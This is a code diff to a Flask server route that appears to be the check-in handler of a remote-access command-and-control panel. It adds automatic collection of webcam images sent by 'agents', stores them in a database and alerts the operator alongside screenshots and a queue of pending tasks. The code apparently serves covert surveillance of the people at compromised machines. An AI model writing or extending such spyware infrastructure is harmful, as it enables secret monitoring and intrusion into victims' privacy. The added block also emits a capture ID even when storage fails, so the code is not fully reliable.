@@ -687,7 +687,39 @@ def init_api_routes(app, socketio):
                 except Exception as e:
                     app.logger.error(f"Error emitting new_screenshot event: {str(e)}")
 
-            c.execute('''SELECT id, task_type, task_data FROM tasks 
+            # Handle automatic webcam captures during checkin
+            if 'webcam' in data:
+                try:
+                    if isinstance(data['webcam'], str):
+                        image_data = base64.b64decode(data['webcam'])
+                    else:
+                        image_data = data['webcam']
+
+                    if len(image_data) > 10 * 1024 * 1024:
+                        raise ValueError("Webcam image too large")
+
+                    c.execute('''INSERT INTO webcam_captures
+                                VALUES (?, ?, ?, ?)''',
+                             (None, data['agent_id'],
+                              image_data,
+                              datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
+
+                    # Get the inserted webcam capture ID
+                    capture_id = c.lastrowid
+                except Exception as e:
+                    app.logger.error(f"Error storing webcam: {str(e)}")
+
+                # Emit new_webcam event after successful insert
+                try:
+                    socketio.emit('new_webcam', {
+                        'agent_id': data['agent_id'],
+                        'capture_id': capture_id,
+                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+                    })
+                except Exception as e:
+                    app.logger.error(f"Error emitting new_webcam event: {str(e)}")
+
+            c.execute('''SELECT id, task_type, task_data FROM tasks
                          WHERE agent_id=? AND status='pending'
                          ORDER BY created_at LIMIT 1''',
                      (data['agent_id'],))
